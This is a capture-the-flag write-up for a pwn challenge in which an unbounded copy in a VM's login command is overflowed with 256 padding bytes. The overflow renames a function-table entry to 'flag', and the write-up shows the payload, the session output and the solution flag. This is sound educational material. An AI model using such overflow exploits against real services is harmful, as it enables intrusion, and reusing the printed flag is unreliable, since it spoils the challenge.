## CTF Writeup: **cmashine** (Complex Machine)

**Challenge Name:** **cmashine**

**Category:** Pwn / Reverse Engineering

**Points:** 96

**Author:** acez

### Challenge Overview

The challenge provides a netcat service (`nc cmashine.play.ctf.se 9190`) which presents a "Complex Machine" shell. The VM supports various operations including memory manipulation (`load`, `store`, `mem`), arithmetic (`add`, `sub`, `xor`, `mul`), and function calls (`call`, `functions`).

### Initial Reconnaissance

Connecting to the service and running `help` revealed the available commands. Using `functions` showed the standard set of operations: `echo`, `strreverse`, `randstring`, and `strtohex`. A memory dump via `mem` revealed a 512-byte buffer:

- **0x000 - 0x0FF:** User data/General purpose memory.
    
- **0x100 - 0x1FF:** Function Name Table (containing strings like "echo", "strreverse", etc.).
    

### Vulnerability Discovery

Through blackbox testing, a critical vulnerability was found in the `login` command. The command syntax was `login <password>`. By observing the memory dump after failed login attempts, it became clear that `login` was performing an unbounded `strcpy` starting at **address 0**.

While the `readstr` and `store` commands had strict bounds checking to prevent writing into the Function Name Table (address 256+), the `login` command did not. This allowed for a classic **Buffer Overflow**.

### Exploitation Strategy

The goal was to overwrite the Function Name Table to trick the VM into executing a hidden flag-printing routine.

1. **Calculating the Offset:** The Function Name Table starts at address 256 (0x100).
    
2. **Crafting the Payload:** A payload consisting of 256 padding characters followed by the string "flag" would overwrite the first entry in the table (originally "echo").
    
3. **Executing the Hijack:**
    
    - Send the payload: `login AAAAAAAAAAAAAAAAA...[256 times]...flag`
        
    - Verify the hijack with `functions`: The list now showed `flag` instead of `echo`.
        
    - Trigger the exploit: `call flag`
        

### Final Execution

Bash

```
#> login AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAflag
Invalid password: ...flag !

#> functions
Available Functions: 
        flag
        strreverse
        randstring
        strtohex

#> call flag
FLAG: midnight{700_b1G_f0r_th3_m4ch1ne}
```

### Conclusion

The VM relied on bounds checking for its primary memory-writing commands but failed to secure the input buffer for the `login` function. This allowed for an overwrite of the internal function pointers/names, leading to arbitrary function execution.

**Flag:** `midnight{700_b1G_f0r_th3_m4ch1ne}`
```
